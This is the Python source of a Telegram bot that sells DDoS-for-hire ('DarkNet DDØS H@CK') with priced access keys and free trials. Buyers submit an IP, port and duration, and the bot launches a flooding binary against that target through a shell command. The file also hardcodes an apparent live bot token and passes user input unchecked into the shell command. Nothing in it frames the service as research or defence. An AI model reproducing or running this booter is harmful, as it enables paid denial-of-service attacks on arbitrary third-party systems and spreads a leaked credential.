import os
import telebot
import asyncio
import logging
import random
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()
TOKEN = '7973618951:AAGVMihyv7ZaUuBn2zRdLv4euAMTENdY1ks'
bot = telebot.TeleBot(TOKEN)
OWNER_IDS = [7468235894, 6404882101, 6902791681]

KEYS_FILE = 'keys.txt'
USED_KEYS_FILE = 'used_keys.txt'
TRIAL_USERS_FILE = 'trial_users.txt'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

# Cooldown tracking dictionary
user_cooldowns = {}

owner_username = '@DarkNet_AJ'  # Do not change this

VALID_DURATIONS = {
    "1 hour": (10, 1/24),
    "2 hour": (20, 2/24),
    "3 hour": (30, 3/24),
    "4 hour": (40, 4/24),
    "5 hour": (50, 5/24),
    "1 day": (99, 1),
    "2 days": (149, 2),
    "3 days": (199, 3),
    "4 days": (249, 4),
    "5 days": (299, 5),
    "6 days": (349, 6),
    "7 days": (399, 7),
    "30 days": (999, 30)
}

async def run_attack_command_on_codespace(ip, port, duration, message):
    # Ensure duration doesn't exceed 300 seconds
    duration = min(int(duration), 300)
    command = f"./bgmi {ip} {port} {duration} 500"
    try:
        process = await asyncio.create_subprocess_shell(command)
        running_processes.append(process)
        await process.communicate()
        
        # Attack completed successfully - send notification
        user_name = message.from_user.first_name
        if message.from_user.username:
            user_name = f"@{message.from_user.username}"
            
        bot.reply_to(
            message,
            f"✅ *Paid Attack Successfully Completed!* ✅\n\n"
            f"👤 *User:* {user_name}\n"
            f"🎯 *Target:* {ip}:{port}\n"
            f"⏱ *Duration:* {duration} seconds\n\n"
            f"📌 *Note:* Next attack available after 10 seconds\n"
            f"👑 *Owner:* {owner_username}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Attack error: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

def is_user_approved(user_id):
    if user_id in OWNER_IDS:
        return True
    if not os.path.exists(USED_KEYS_FILE):
        return False
    with open(USED_KEYS_FILE, 'r') as file:
        for line in file:
            data = eval(line.strip())
            if data['user_id'] == user_id:
                if datetime.now() <= datetime.fromisoformat(data['valid_until']):
                    return True
    return False

def send_price_list(chat_id):
    if owner_username != '@DarkNet_AJ':
        bot.send_message(chat_id, "ERROR: Owner contact invalid.", parse_mode='Markdown')
        return

    msg = ("🔤🔤😉😌😍🥰⚜️✅\n\n"
           "🛒 *DarkNet DDØS H@CK* 💰💰💰\n\n"
           "*PRICE LIST👇🥰😍*\n\n"
           "MOST POWERFUL BOT ✅✅✅\n\n"
           "FEATURES 1000+ Second MAX ATTACK 🚀1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣8️⃣9️⃣0️⃣✅📢\n\n"
           "⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️\n\n"
           "PRICE LIST 🛒\n\n"
           "⚡️1 day = ₹149 ✅\n"
           "⚡️2 day = ₹199 ✅\n"
           "⚡️3 day = ₹249 ✅\n"
           "⚡️4 day = ₹299 ✅\n"
           "⚡️5 day = ₹349 ✅\n"
           "⚡️6 day = ₹399 ✅\n"
           "SECOND BOT ✅✅✅\n\n"
           "PRICE LIST👇🥰😍\n\n"
           "FEATURES 300 second MAX ATTACK 🚀\n\n"
           "⏳5 HOUR = ₹50 ✅\n"
           "⏳1 DAY = ₹99 ✅\n"
           "⏳2 DAYS = ₹149 ✅\n"
           "⏳3 DAYS = ₹199 ✅\n"
           "⏳4 DAYS = ₹249 ✅\n"
           "⏳5 DAYS = ₹299 ✅\n"
           "⏳6 DAYS = ₹349 ✅\n"
           "⏳7 DAYS = ₹399 ✅\n"
           "⏳30 DAYS = ₹999 ✅\n\n"
           "*BUY DM 👉 @DarkNet_AJ*\n\n")
    bot.send_message(chat_id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['key'])
def handle_key_generation(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "Only owner can generate keys.", parse_mode='Markdown')
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Use like:* /key 2 hour\n*Valid options:* {valid_keys}", parse_mode='Markdown')
        return
    
    duration = args[1].lower()
    if duration not in VALID_DURATIONS:
        valid_keys = ', '.join(VALID_DURATIONS.keys())
        bot.send_message(message.chat.id, f"*Invalid duration.* Use one of: {valid_keys}", parse_mode='Markdown')
        return
    
    price, days = VALID_DURATIONS[duration]
    key = f"{duration.replace(' ', '')}-" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    with open(KEYS_FILE, 'a') as f:
        f.write(f"{key}\n")
    bot.send_message(message.chat.id, f"*Key generated for {duration} (₹{price}):*\n`{key}`", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    bot.send_message(message.chat.id, "Send your key to activate access:", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    user_id = message.from_user.id

    if not os.path.exists(KEYS_FILE):
        bot.send_message(message.chat.id, "*No keys available.*", parse_mode='Markdown')
        return
    
    with open(KEYS_FILE, 'r') as file:
        keys = [line.strip() for line in file]
    
    if key not in keys:
        bot.send_message(message.chat.id, "*Invalid key.*", parse_mode='Markdown')
        return
    
    with open(KEYS_FILE, 'w') as file:
        for k in keys:
            if k != key:
                file.write(f"{k}\n")
    
    try:
        duration = key.split('-')[0]
        for valid_key in VALID_DURATIONS:
            if duration in valid_key.replace(" ", ""):
                price, days = VALID_DURATIONS[valid_key]
                break
        else:
            raise ValueError("Invalid duration")
        
        valid_until = (datetime.now() + timedelta(days=days)).isoformat()
        with open(USED_KEYS_FILE, 'a') as f:
            f.write(f"{{'user_id': {user_id}, 'valid_until': '{valid_until}', 'key': '{key}', 'username': '{message.from_user.username}'}}\n")
        bot.send_message(message.chat.id, f"*Access granted for {valid_key}!*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Redeem error: {e}")
        bot.send_message(message.chat.id, "*Error processing key.*", parse_mode='Markdown')

@bot.message_handler(commands=['cancelkey'])
def cancel_key(message):
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.send_message(message.chat.id, "Only owner can cancel keys.", parse_mode='Markdown')
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.send_message(message.chat.id, "*Use like:* /cancelkey <key>", parse_mode='Markdown')
        return
    
    key_to_cancel = args[1].strip()
    updated_lines = []
    found = False
    
    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, 'r') as f:
            for line in f:
                if key_to_cancel not in line:
                    updated_lines.append(line)
                else:
                    found = True
        
        with open(USED_KEYS_FILE, 'w') as f:
            f.writelines(updated_lines)
    
    if found:
        bot.send_message(message.chat.id, f"*Key `{key_to_cancel}` cancelled successfully.*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*Key not found or already expired.*", parse_mode='Markdown')

@bot.message_handler(commands=['chek'])
def check_keys(message):
    if message.from_user.id not in OWNER_IDS:
        bot.send_message(message.chat.id, "Only owner can use this command.", parse_mode='Markdown')
        return

    active_keys = []
    expired_keys = []
    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, 'r') as f:
            for line in f:
                data = eval(line.strip())
                valid_until = datetime.fromisoformat(data['valid_until'])
                if valid_until >= datetime.now():
                    active_keys.append(f"`{data['key']}` by @{data.get('username', 'N/A')}")
                else:
                    expired_keys.append(data['key'])
    
    msg = f"*Active Keys:* {len(active_keys)}\n"
    if active_keys:
        msg += '\n' + '\n'.join(active_keys)
    bot.send_message(message.chat.id, msg, parse_mode='Markdown')

@bot.message_handler(commands=['trial'])
def trial(message):
    user_id = message.from_user.id
    if user_id in OWNER_IDS:
        bot.send_message(message.chat.id, "You already have access.", parse_mode='Markdown')
        return

    if os.path.exists(TRIAL_USERS_FILE):
        with open(TRIAL_USERS_FILE, 'r') as f:
            if str(user_id) in f.read():
                bot.send_message(message.chat.id, "*You have already used your free trial.*", parse_mode='Markdown')
                return
    
    expiry = (datetime.now() + timedelta(minutes=10)).isoformat()
    with open(USED_KEYS_FILE, 'a') as f:
        f.write(f"{{'user_id': {user_id}, 'valid_until': '{expiry}', 'key': 'trial', 'username': '{message.from_user.username}'}}\n")
    
    with open(TRIAL_USERS_FILE, 'a') as f:
        f.write(f"{user_id}\n")
    
    bot.send_message(message.chat.id, "*10-minute trial activated!*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 Start Attack"),
               KeyboardButton("✅ My Account"))
    markup.add(KeyboardButton("🔐🔑 Buy Key"),
               KeyboardButton("🚩 Trial"))
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    user_id = message.from_user.id
    text = message.text.strip().replace("*", "").replace("🚀", "").replace("✅", "").replace("🔐🔑", "").replace("🚩", "").strip().lower()

    if text == "start attack":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        
        # Check cooldown
        if user_id in user_cooldowns:
            remaining_time = (user_cooldowns[user_id] - datetime.now()).total_seconds()
            if remaining_time > 0:
                bot.send_message(
                    message.chat.id,
                    f"⏳ *Please wait {int(remaining_time)} seconds before next attack!*",
                    parse_mode='Markdown'
                )
                return
        
        bot.send_message(message.chat.id, "*Send IP, Port, Time (max 300 seconds):*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack)
    elif text == "my account":
        if not is_user_approved(user_id):
            send_price_list(message.chat.id)
            return
        
        expiry = "Unknown"
        with open(USED_KEYS_FILE, 'r') as file:
            for line in file:
                data = eval(line.strip())
                if data['user_id'] == user_id:
                    expiry = data['valid_until']
        
        # Add cooldown info if applicable
        cooldown_info = ""
        if user_id in user_cooldowns:
            remaining_time = (user_cooldowns[user_id] - datetime.now()).total_seconds()
            if remaining_time > 0:
                cooldown_info = f"\n*Cooldown:* {int(remaining_time)} seconds remaining"
        
        bot.send_message(
            message.chat.id,
            f"*User ID:* `{user_id}`\n*Valid Until:* `{expiry}`{cooldown_info}",
            parse_mode='Markdown'
        )
    elif text == "buy key":
        send_price_list(message.chat.id)
    elif text == "trial":
        trial(message)
    else:
        bot.send_message(message.chat.id, "*Invalid option. Choose from menu.*", parse_mode='Markdown')

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "Invalid format. Use: IP PORT TIME", parse_mode='Markdown')
            return

        ip, port, time = args[0], int(args[1]), int(args[2])
        
        # Check time limit (300 seconds)
        if time > 300:
            bot.send_message(message.chat.id, "*Maximum attack time is 300 seconds (5 minutes)*", parse_mode='Markdown')
            return
        
        if port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {port} is blocked.*", parse_mode='Markdown')
            return
        
        # Set cooldown (10 seconds)
        user_cooldowns[message.from_user.id] = datetime.now() + timedelta(seconds=10)
        
        asyncio.run_coroutine_threadsafe(
            run_attack_command_on_codespace(ip, port, time, message),  # Pass message object here
            loop
        )
        
        # Initial attack confirmation message
        user_name = message.from_user.first_name
        if message.from_user.username:
            user_name = f"@{message.from_user.username}"
            
        bot.send_message(
            message.chat.id,
            f"🚀 *Attack Started Successfully!* 🚀\n\n"
            f"👤 *User:* {user_name}\n"
            f"🎯 *Target:* {ip}:{port}\n"
            f"⏱ *Duration:* {time} seconds\n"
            f"⏳ *Cooldown:* 10 seconds after attack\n\n"
            f"👑 *Owner:* {owner_username}",
            parse_mode='Markdown'
        )
        
    except ValueError:
        bot.send_message(message.chat.id, "*Invalid time value. Please enter a number.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(message.chat.id, "*Error in attack command.*", parse_mode='Markdown')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.polling(none_stop=True)